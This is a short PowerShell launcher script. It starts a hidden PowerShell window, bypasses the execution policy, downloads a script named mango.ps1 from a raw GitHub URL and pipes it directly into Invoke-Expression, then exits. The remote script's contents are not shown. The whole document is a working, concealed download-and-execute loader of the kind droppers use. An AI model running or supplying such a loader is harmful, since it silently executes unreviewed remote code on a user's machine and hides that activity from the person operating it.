$scriptUrl = 'https://raw.githubusercontent.com/sevcator/mango-mango-mango/refs/heads/main/mango.ps1'
Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iwr -Uri '$scriptUrl' -UseBasicParsing | iex`"" -WindowStyle Hidden
exit
